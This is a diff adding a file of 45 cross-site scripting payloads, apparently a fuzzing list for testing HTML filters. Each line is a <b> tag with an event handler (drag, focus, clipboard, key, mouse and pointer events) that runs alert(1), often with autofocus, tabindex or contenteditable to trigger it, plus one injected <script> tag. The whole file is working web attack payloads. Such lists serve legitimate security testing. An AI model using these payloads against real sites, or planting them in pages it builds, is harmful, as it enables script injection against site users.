@@ -1,0 +1,46 @@
+<b>XSS</b>
+<b draggable="true" ondrag="alert(1)">test</b>
+<b draggable="true" ondragend="alert(1)">test</b>
+<b draggable="true" ondragenter="alert(1)">test</b>
+<b draggable="true" ondragleave="alert(1)">test</b>
+<b draggable="true" ondragstart="alert(1)">test</b>
+<b id=x tabindex=1 onactivate=alert(1)></b>
+<b id=x tabindex=1 onbeforeactivate=alert(1)></b>
+<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>
+<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>
+<b id=x tabindex=1 onfocus=alert(1)></b>
+<b id=x tabindex=1 onfocusin=alert(1)></b>
+<b onafterscriptexecute=alert(1)><script>1</script>
+<b onbeforecopy="alert(1)" contenteditable>test</b>
+<b onbeforecut="alert(1)" contenteditable>test</b>
+<b onbeforepaste="alert(1)" contenteditable>test</b>
+<b onbeforescriptexecute=alert(1)><script>1</script>
+<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>
+<b onclick="alert(1)">test</b>
+<b oncontextmenu="alert(1)">test</b>
+<b oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<b oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<b ondblclick="alert(1)" autofocus tabindex=1>test</b>
+<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>
+<b onkeydown="alert(1)" contenteditable>test</b>
+<b onkeypress="alert(1)" contenteditable>test</b>
+<b onkeyup="alert(1)" contenteditable>test</b>
+<b onmousedown="alert(1)">test</b>
+<b onmouseenter="alert(1)">test</b>
+<b onmouseleave="alert(1)">test</b>
+<b onmousemove="alert(1)">test</b>
+<b onmouseout="alert(1)">test</b>
+<b onmouseover="alert(1)">test</b>
+<b onmouseup="alert(1)">test</b>
+<b onmousewheel=alert(1)>requires scrolling
+<b onpaste="alert(1)" contenteditable>test</b>
+<b onpointerdown=alert(1)>XSS</b>
+<b onpointerenter=alert(1)>XSS</b>
+<b onpointerleave=alert(1)>XSS</b>
+<b onpointermove=alert(1)>XSS</b>
+<b onpointerout=alert(1)>XSS</b>
+<b onpointerover=alert(1)>XSS</b>
+<b onpointerrawupdate=alert(1)>XSS</b>
+<b onpointerup=alert(1)>XSS</b>
+<b <script>alert(1)</script>0
+
